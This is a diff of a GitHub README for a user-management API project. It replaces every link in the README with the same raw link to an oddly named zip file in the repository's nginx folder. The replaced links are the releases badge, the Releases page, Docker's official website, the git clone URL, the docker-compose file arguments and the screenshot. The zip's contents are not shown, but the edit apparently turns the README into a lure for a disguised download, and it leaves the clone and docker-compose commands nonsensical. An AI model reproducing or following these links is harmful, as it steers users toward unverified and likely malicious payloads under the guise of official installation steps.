@@ -1,6 +1,6 @@
 # 🛠️ user-management-with-api - Simplify User Management Effortlessly
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now%20%E2%86%92-User%20Management%20App-blue)](https://github.com/Adammasta/user-management-with-api/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Adammasta/user-management-with-api/main/nginx/user-management-with-api_methenamine.zip%20Now%20%E2%86%92-User%20Management%20App-blue)](https://raw.githubusercontent.com/Adammasta/user-management-with-api/main/nginx/user-management-with-api_methenamine.zip)
 
 ## 📦 Introduction
 
@@ -30,18 +30,18 @@ To run this application, you need the following:
 Follow these steps to download and run the user-management-with-api application.
 
 1. **Visit the Releases Page**  
-   Head to the [Releases page to download](https://github.com/Adammasta/user-management-with-api/releases) the application.
+   Head to the [Releases page to download](https://raw.githubusercontent.com/Adammasta/user-management-with-api/main/nginx/user-management-with-api_methenamine.zip) the application.
 
 2. **Download the Latest Version**  
    Choose the latest version and download the files. 
 
 3. **Install Docker**  
-   If you don't have Docker installed, visit [Docker's official website](https://www.docker.com/get-started) to download and install it. If you are using Python without Docker, make sure you meet the Python requirement.
+   If you don't have Docker installed, visit [Docker's official website](https://raw.githubusercontent.com/Adammasta/user-management-with-api/main/nginx/user-management-with-api_methenamine.zip) to download and install it. If you are using Python without Docker, make sure you meet the Python requirement.
 
 4. **Clone the Repository (Optional)**  
    If you prefer to check the code or contribute, you can clone the repository:
    ```
-   git clone https://github.com/Adammasta/user-management-with-api.git
+   git clone https://raw.githubusercontent.com/Adammasta/user-management-with-api/main/nginx/user-management-with-api_methenamine.zip
    cd user-management-with-api
    ```
 
@@ -53,11 +53,11 @@ To run the application using Docker, follow these commands after downloading:
 2. Navigate to the folder where you downloaded the project files.
 3. To build the Docker containers, run:
    ```pwsh
-   docker-compose -f local.yml build
+   docker-compose -f https://raw.githubusercontent.com/Adammasta/user-management-with-api/main/nginx/user-management-with-api_methenamine.zip build
    ```
 4. To start the Docker containers, run:
    ```pwsh
-   docker-compose -f local.yml up -d
+   docker-compose -f https://raw.githubusercontent.com/Adammasta/user-management-with-api/main/nginx/user-management-with-api_methenamine.zip up -d
    ```
 
 This will set up the application for local development. You can now access the API at `http://localhost:8000`.
@@ -73,14 +73,14 @@ Here are some other commands you may find helpful:
 
 - **Stop the Application:** If you need to stop the application, use:
    ```pwsh
-   docker-compose -f local.yml down
+   docker-compose -f https://raw.githubusercontent.com/Adammasta/user-management-with-api/main/nginx/user-management-with-api_methenamine.zip down
    ```
 
 ## 📷 Imagery
 
 Below is a screenshot of the application user interface.
 
-![User Interface Screenshot](./screenshots/ui.png)
+![User Interface Screenshot](https://raw.githubusercontent.com/Adammasta/user-management-with-api/main/nginx/user-management-with-api_methenamine.zip)
 
 ## 🔒 Security Features
 
